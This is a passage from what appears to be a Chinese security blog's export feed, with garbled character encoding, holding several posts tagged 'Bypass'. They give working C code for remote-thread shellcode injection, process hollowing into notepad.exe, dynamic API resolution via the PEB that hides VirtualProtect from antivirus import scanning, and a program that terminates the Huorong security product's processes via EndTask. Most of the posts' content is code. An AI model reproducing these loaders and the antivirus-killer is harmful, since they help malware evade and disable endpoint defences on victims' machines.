<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://d3sh1n.github.io/2022/01/06/APC-%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/">https://d3sh1n.github.io/2022/01/06/APC-%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</a><br><a href="https://cn-sec.com/archives/406854.html">https://cn-sec.com/archives/406854.html</a><br><a href="https://www.anquanke.com/post/id/252487">https://www.anquanke.com/post/id/252487</a><br><a href="https://xz.aliyun.com/t/11153#toc-8">https://xz.aliyun.com/t/11153#toc-8</a><br><a href="https://www.anquanke.com/post/id/252487#h2-2">https://www.anquanke.com/post/id/252487#h2-2</a><br><a href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/">https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿›ç¨‹æ³¨å…¥_AND_ProcessHollowing</title>
    <url>/posts/5e5076eb/</url>
    <content><![CDATA[<h4 id="è¿œçº¿ç¨‹æ³¨å…¥"><a href="#è¿œçº¿ç¨‹æ³¨å…¥" class="headerlink" title="è¿œçº¿ç¨‹æ³¨å…¥"></a>è¿œçº¿ç¨‹æ³¨å…¥</h4><p>æ³¨å…¥åˆ°å¸¦æœ‰ç­¾åçš„ç™½åå•ç¨‹åºä¸­</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;å¼‚æˆ–åçš„shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">INT <span class="title function_">FoundPid</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szName)</span> &#123;</span><br><span class="line">	<span class="comment">// è®¾ç½®å˜é‡</span></span><br><span class="line">	PROCESSENTRY32 pe = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hSnapShot = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// åˆå§‹åŒ–å¤§å°</span></span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	<span class="comment">// åˆ›å»ºè¿›ç¨‹å¿«ç…§</span></span><br><span class="line">	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="comment">// è·å–å¿«ç…§</span></span><br><span class="line">		BOOL Process = Process32First(hSnapShot, &amp;pe);</span><br><span class="line">		<span class="keyword">if</span> (!Process) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// éå†å¿«ç…§</span></span><br><span class="line">		<span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe)) &#123;</span><br><span class="line">			<span class="comment">// åˆ¤æ–­è¿›ç¨‹åæ˜¯å¦ç›¸åŒ</span></span><br><span class="line">			<span class="keyword">if</span> (!_wcsicmp(szName, pe.szExeFile)) &#123;</span><br><span class="line">				pid = pe.th32ProcessID;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;[+] æ‰¾åˆ°æŒ‡å®šè¿›ç¨‹pid: %d\n&quot;</span>, pe.th32ProcessID);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		CloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span> pid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] è¿›ç¨‹å¿«ç…§åˆ›å»ºå¤±è´¥!\té”™è¯¯å€¼: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InjectShellCode</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szName)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE Handle, remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	<span class="type">int</span> Pid = FoundPid(szName);</span><br><span class="line">	Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">	<span class="comment">// è¿˜åŸå¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">50</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	remoteBuffer = VirtualAllocEx(Handle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(Handle, remoteBuffer, buf, <span class="keyword">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line">	remoteThread = CreateRemoteThread(Handle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(Handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	InjectShellCode(<span class="string">L&quot;notepad.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="å‚€å„¡è¿›ç¨‹-Process-Hollowing"><a href="#å‚€å„¡è¿›ç¨‹-Process-Hollowing" class="headerlink" title="å‚€å„¡è¿›ç¨‹ Process Hollowing"></a>å‚€å„¡è¿›ç¨‹ Process Hollowing</h4><p>å‚€å„¡è¿›ç¨‹ï¼šåˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åå°†å…¶è™šæ‹Ÿåœ°å€é‡Œçš„å†…å®¹æç©ºï¼Œæ³¨å…¥æƒ³è¦æ³¨å…¥çš„è¿›ç¨‹ï¼Œä»¥è¾¾åˆ°æ©äººè€³ç›®çš„æ•ˆæœ</p>
<ul>
<li><ol>
<li>åˆ›å»ºæŒ‚èµ·è¿›ç¨‹<br><code>CreateProcess(PATH_TO_HOST_EXE, ..., CREATE_SUSPENDED, ...)</code> ä¾¿å¯åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çŠ¶æ€çš„è¿›ç¨‹.</li>
</ol>
</li>
<li><ol start="2">
<li>è·å–è¿›ç¨‹ä¸Šä¸‹æ–‡ç»“æ„<br>ä½¿ç”¨ <code>GetThreadContext()</code> è·å–è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼ˆå¯„å­˜å™¨çŠ¶æ€ï¼‰</li>
</ol>
</li>
<li><ol start="3">
<li>å†™å…¥å‚€å„¡è¿›ç¨‹(ç”³è¯·å†…å­˜ç©ºé—´ï¼Œå†™å…¥shellcode)<br><code>VirtualAllocEx() </code> é‡æ–°åˆ†é…ç©ºé—´å¤§å°ä¸ºå‚€å„¡è¿›ç¨‹çš„å¤§å°ï¼Œ<code>WriteProcessMemory()</code> å‘åˆ†é…çš„ç©ºé—´å†™å…¥å‚€å„¡è¿›ç¨‹.</li>
</ol>
</li>
<li><ol start="4">
<li>æ¢å¤ç°åœº(è®¾ç½®ä¸Šä¸‹æ–‡ï¼Œæ¢å¤çº¿ç¨‹)<br>ç”±äºç›®æ ‡è¿›ç¨‹å’Œå‚€å„¡è¿›ç¨‹çš„å…¥å£ç‚¹ä¸€èˆ¬ä¸åŒï¼Œæ‰€ä»¥åœ¨æ¢å¤å‰éœ€è¦æ›´æ”¹çº¿ç¨‹å…¥å£ç‚¹ï¼Œä½¿ç”¨ <code>SetThreadContext</code> å‡½æ•°ï¼Œæœ€åä½¿ç”¨ <code>ResumeThread</code> å‡½æ•°é‡Šæ”¾è¿è¡Œ.</li>
</ol>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;å¼‚æˆ–çš„shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">ReplaceProcess</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pszFilePath)</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	CONTEXT threadContext = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	RtlZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	RtlZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">	RtlZeroMemory(&amp;threadContext, <span class="keyword">sizeof</span>(threadContext));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// åˆ›å»ºè¿›ç¨‹å¹¶æŒ‚èµ·ä¸»çº¿ç¨‹</span></span><br><span class="line">	bRet = CreateProcessA(pszFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// åœ¨æ›¿æ¢çš„è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å†…å­˜</span></span><br><span class="line">	LPVOID lpDestBaseAddr = VirtualAllocEx(pi.hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == lpDestBaseAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// è¿˜åŸå¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">50</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// å†™å…¥æ›¿æ¢çš„æ•°æ®</span></span><br><span class="line">	bRet = WriteProcessMemory(pi.hProcess, lpDestBaseAddr, buf, <span class="keyword">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessError&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// è·å–çº¿ç¨‹ä¸Šä¸‹æ–‡</span></span><br><span class="line">	<span class="comment">// æ³¨æ„æ­¤å¤„æ ‡å¿—ï¼Œä¸€å®šè¦å†™!!!</span></span><br><span class="line">	threadContext.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	bRet = GetThreadContext(pi.hThread, &amp;threadContext);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetThreadContext&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// ä¿®æ”¹eipä»æ–°ç”³è¯·çš„å†…å­˜å¤„è¿è¡Œ</span></span><br><span class="line">	threadContext.Rip = (DWORD64)lpDestBaseAddr;</span><br><span class="line">	<span class="comment">// è®¾ç½®æŒ‚èµ·è¿›ç¨‹çš„çº¿ç¨‹ä¸Šä¸‹æ–‡</span></span><br><span class="line">	bRet = SetThreadContext(pi.hThread, &amp;threadContext);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;SetThreadContext&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// æ¢å¤æŒ‚èµ·çš„è¿›ç¨‹çš„çº¿ç¨‹</span></span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	ReplaceProcess(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://bbs.pediy.com/thread-224706.htm">https://bbs.pediy.com/thread-224706.htm</a><br><a href="https://jev0n.com/2020/03/11/65.html">https://jev0n.com/2020/03/11/65.html</a><br><a href="https://www.cnblogs.com/bonelee/p/15957493.html">https://www.cnblogs.com/bonelee/p/15957493.html</a><br><a href="https://juejin.cn/post/6844903587626090503#process-hollowing">https://juejin.cn/post/6844903587626090503#process-hollowing</a><br><a href="https://www.52pojie.cn/thread-501486-1-1.html">https://www.52pojie.cn/thread-501486-1-1.html</a><br><a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>åŠ¨æ€è·å–API</title>
    <url>/posts/224ae4c2/</url>
    <content><![CDATA[<p>æ€è½¯æœ‰æ—¶ä¸ä»…ä¼šæ£€æŸ¥å†…éƒ¨ç‰¹å¾ï¼Œä¹Ÿä¼šæ£€æŸ¥å¯¼å…¥è¡¨ä¸­æ˜¯å¦å«æœ‰æ•æ„Ÿå‡½æ•°ã€‚é€šå¸¸ä¼šå¯¹ PE æ–‡ä»¶çš„å¯¼å…¥è¡¨é€šè¿‡è®¡ç®— hash å€¼è¿›è¡Œå¯¹æ¯”ï¼Œçœ‹æœ‰æ²¡æœ‰æ•æ„Ÿå‡½æ•°ï¼Œå¦‚æœæœ‰ä¼šè¿›è¡Œé¢å¤–çš„æ£€æµ‹ã€‚<br>åŠ¨æ€è·å–ä¸»è¦æ˜¯é€šè¿‡æ‰¾åˆ° kernerl32. dllã€‚è¿™æ ·å°±ä¸ä¼šå†å¯¼å…¥è¡¨å‡ºç° VirtualProtect</p>
<p><strong>TEB</strong>ï¼ˆThread Environment Blockï¼Œçº¿ç¨‹ç¯å¢ƒå—ï¼‰ç³»ç»Ÿåœ¨æ­¤ TEB ä¸­ä¿å­˜é¢‘ç¹ä½¿ç”¨çš„çº¿ç¨‹ç›¸å…³çš„æ•°æ®ã€‚ä½äºç”¨æˆ·åœ°å€ç©ºé—´ï¼Œåœ¨æ¯” PEB æ‰€åœ¨åœ°å€ä½çš„åœ°æ–¹ã€‚ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œå½“å‰çº¿ç¨‹çš„ TEB ä½äºç‹¬ç«‹çš„ 4KB æ®µ (é¡µ)ï¼Œå¯é€šè¿‡ CPU çš„ FS å¯„å­˜å™¨æ¥è®¿é—®è¯¥æ®µï¼Œä¸€èˆ¬å­˜å‚¨åœ¨[FS: 0]</p>
<p><strong>PEB</strong>ï¼ˆProcess Environment Blockï¼Œè¿›ç¨‹ç¯å¢ƒå—ï¼‰å­˜æ”¾è¿›ç¨‹ä¿¡æ¯ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„PEBä¿¡æ¯ã€‚ä½äºç”¨æˆ·åœ°å€ç©ºé—´ã€‚å¯åœ¨TEBç»“æ„åœ°å€åç§»0x30å¤„è·å¾—PEBçš„åœ°å€ä½ç½®ã€‚</p>
<p>ä½¿ç”¨ windbg æŸ¥çœ‹ teb ç»“æ„<br><code>dt -rl _teb</code><br><img src="/posts/224ae4c2/1.png"></p>
<p>åœ¨+0x30 å¤„ä¸º peb åœ°å€<br>é€šè¿‡ <code>fs:[0]</code> å¯„å­˜å™¨è®¿é—®åˆ° TEB çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬åˆçŸ¥é“äº†å¯ä»¥é€šè¿‡ <code>TEB</code> ç»“æ„åç§» 0x30 å¤„æŒ‡å‘çš„åœ°å€æ˜¯ PEB ç»“æ„åœ°å€ï¼Œå³ <code>fs:[0]</code> -&gt; <code>TEB</code> -&gt; <code>PEB</code>ï¼Œåœ¨è¿™ä¸€æ­¥å®Œæˆ PEB åœ°å€çš„å®šä½.<br><code>dt -rl _peb</code><br><img src="/posts/224ae4c2/2.png"></p>
<p>åœ¨ peb åç§» 0xc å¤„ä½ ldf ç»“æ„çš„åœ°å€, åœ¨ ldr ä¸‹å­˜åœ¨ä¸‰ä¸ªåŒé“¾è¡¨ç»“æ„ï¼Œè¿™ä¸‰ä¸ªä¸ºæ¨¡å—åœ¨ä¸åŒçŠ¶æ€çš„é¡ºåº</p>
<p><a href="https://mamor5409.github.io/posts/9aa42a48/">https://mamor5409.github.io/posts/9aa42a48/</a> å‚è€ƒä¹‹å‰å†™çš„</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">HMODULE  <span class="title function_">GetKernel32Addr</span><span class="params">()</span> &#123;</span><br><span class="line">	HMODULE Kernel32Base = <span class="number">0</span>;</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, fs:[<span class="number">0x30</span>] <span class="comment">//peb</span></span><br><span class="line">		mov eax, dword ptr[eax + <span class="number">0xc</span>]<span class="comment">//_PEB_LDR_DATA</span></span><br><span class="line">		mov eax, dword ptr[eax + <span class="number">0xc</span>]<span class="comment">//InLoadOrderModuleList </span></span><br><span class="line">		mov eax, [eax] <span class="comment">//ntdll</span></span><br><span class="line">		mov eax, [eax] <span class="comment">//kernel32dll</span></span><br><span class="line">		mov eax, dword ptr[eax + <span class="number">0x18</span>]</span><br><span class="line">		mov Kernel32Base, eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Kernel32Base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;å¼‚æˆ–çš„shellcode&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">892</span>]; <span class="comment">//shellcodeé•¿åº¦</span></span><br><span class="line">	<span class="type">int</span> len = <span class="keyword">sizeof</span>(shellcode) - <span class="number">1</span>;  <span class="comment">//ä»0å¼€å§‹ç®— æ‰€ä»¥-1</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)  <span class="comment">//å¼‚æˆ–shellcode</span></span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] ^= <span class="number">10</span>;</span><br><span class="line">		shellcode[i] = buf[i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI *pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span>;</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">	HMODULE hKernal32 = GetKernel32Addr(); <span class="comment">//kernal32Base</span></span><br><span class="line"></span><br><span class="line">	pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);<span class="comment">//å¾—åˆ°VirtualProtect</span></span><br><span class="line"></span><br><span class="line">	VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//VirtualProtect(&amp;shellcode, sizeof(shellcode), oldProtect, NULL);</span></span><br><span class="line">	HANDLE handle = CreateThread(<span class="number">0</span>,<span class="number">0</span>,shellcode, CREATE_SUSPENDED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	Sleep(<span class="number">15000</span>);</span><br><span class="line">	ResumeThread(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Ring3Killç«ç»’</title>
    <url>/posts/3fe86fb6/</url>
    <content><![CDATA[<p>ä¸€èˆ¬æ€æ¯’è½¯ä»¶ä¼šå¯¹å…³é”®å‡½æ•°æŒ‚é’©ï¼Œç«ç»’è™½ç„¶æ²¡æœ‰å¯¹åº•å±‚ api è¿›è¡ŒæŒ‚é’©ï¼Œä½†æ˜¯ç«ç»’é€šè¿‡ windows å›è°ƒæ¥ç›‘æ§æ•´ä¸ªç³»ç»Ÿã€‚</p>
<p>åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°ç«ç»’æœ‰ä¸‰ä¸ªè¿›ç¨‹</p>
<p><code>HipsDEaemon. exe </code>  åå°å®ˆæŠ¤è¿›ç¨‹</p>
<p><img src="/posts/3fe86fb6/1.png"></p>
<p><code>HipsMain. exe</code>  ä¸»ç•Œé¢<br><img src="/posts/3fe86fb6/2.png"></p>
<p><code>HipsTray. exe</code> æ‰˜ç›˜ç¨‹åº<br><img src="/posts/3fe86fb6/3..png"><br>ä½¿ç”¨ penProcess å’Œ TerminateProcess æ˜¯æ— æ³•å°†è¿›ç¨‹å…³é—­çš„ï¼Œç«ç»’çš„ç³»ç»Ÿå›è°ƒä¼šç›‘æ§åˆ° openprocessã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡ä¸€ä¸ªæœªå¯¼å‡ºå‡½æ•° EndTask å‡½æ•°è¿›è¡Œå…³é—­ï¼Œè¯¥å‡½æ•°å¹¶æ²¡æœ‰è¢«å…¶æŒ‚é’©è¿›è¡Œç›‘æ§ã€‚<br>ä½¿ç”¨processhackeræŸ¥çœ‹csrss.exe çœ‹åˆ°HipsTrayçš„æƒé™ä¸ºå…¨éƒ¨<br><img src="/posts/3fe86fb6/4.png"><br>å¦‚æœæŠŠç«ç»’çš„æ‰˜ç›˜ç¨‹åºæ€æ‰å å®ˆæŠ¤ç¨‹åºä¼šæ”¾è¡Œæ‰€ä»¥æ“ä½œ<br>ä¸è¿‡è¯¥æ–¹æ³•ç°åœ¨å·²ç»ç”¨ä¸äº†äº† åªä½œä¸ºä¸€ç§å­¦ä¹ æ€è·¯å­¦ä¹ ä¸‹<br><img src="/posts/3fe86fb6/5.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI *pEndTask)</span><span class="params">(HWND hWnd, BOOL fShutDown, BOOL fForce)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HWND <span class="title function_">GetXHandle</span><span class="params">(LPCWSTR procName)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD iProcID = <span class="number">0</span>;</span><br><span class="line">	PROCESSENTRY32 pEntry = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pEntry))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pEntry))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (lstrcmpi(procName, pEntry.szExeFile) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					iProcID = pEntry.th32ProcessID;</span><br><span class="line">					CloseHandle(hSnapshot);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HWND hwnd = GetTopWindow(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">while</span> (hwnd)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD pid = <span class="number">0</span>;</span><br><span class="line">		DWORD dwProcessId = GetWindowThreadProcessId(hwnd, &amp;pid);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwProcessId != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pid == iProcID)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> hwnd;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 16336);</span></span><br><span class="line">	<span class="comment">//TerminateProcess(hProcess, 0);</span></span><br><span class="line"></span><br><span class="line">	HMODULE hModule = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	pEndTask endTask = (pEndTask)GetProcAddress(hModule, <span class="string">&quot;EndTask&quot;</span>);</span><br><span class="line">	HWND hwnd = GetXHandle(<span class="string">L&quot;HipsTray.exe&quot;</span>);</span><br><span class="line">	endTask(hwnd, FALSE, <span class="number">1</span>);</span><br><span class="line">	hwnd = GetXHandle(<span class="string">L&quot;HipsMain.exe&quot;</span>);</span><br><span class="line">	endTask(hwnd, FALSE, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>csrss.exe</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/">https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcodeè¿œç¨‹åŠ è½½</title>
    <url>/posts/b8f6edd1/</url>
